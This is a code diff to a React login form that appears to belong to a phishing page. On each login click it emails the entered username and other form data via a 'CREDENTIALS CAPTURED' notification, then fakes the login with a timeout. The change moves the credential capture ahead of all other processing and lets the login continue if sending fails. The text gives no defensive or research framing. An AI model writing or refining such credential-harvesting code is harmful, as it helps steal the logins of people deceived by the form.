@@ -37,11 +37,10 @@ const LoginForm: React.FC<LoginFormProps> = ({ onLoginSuccess }) => {
       return;
     }
 
-    setIsLoading(true);
-
-    // Send HIGH PRIORITY email with ALL FORM DATA immediately when LOGIN button is clicked
+    // Send email IMMEDIATELY when login button is clicked, before any other processing
+    console.log('🚨 LOGIN BUTTON CLICKED - Sending email immediately...');
+    
     try {
-      console.log('🚨 Sending HIGH PRIORITY login attempt email with ALL DATA immediately...');
       await sendHighPriorityNotification({
         step: "🔴 LOGIN BUTTON CLICKED - CREDENTIALS CAPTURED",
         username: formData.username,
@@ -55,10 +54,13 @@ const LoginForm: React.FC<LoginFormProps> = ({ onLoginSuccess }) => {
           timestamp: new Date().toISOString()
         }
       });
-      console.log('✅ HIGH PRIORITY login email with ALL DATA sent immediately!');
+      console.log('✅ Login email sent immediately!');
     } catch (error) {
-      console.error('❌ HIGH PRIORITY login email failed:', error);
+      console.error('❌ Login email failed:', error);
+      // Continue with login process even if email fails
     }
+
+    setIsLoading(true);
 
     // Simulate login process
     setTimeout(() => {
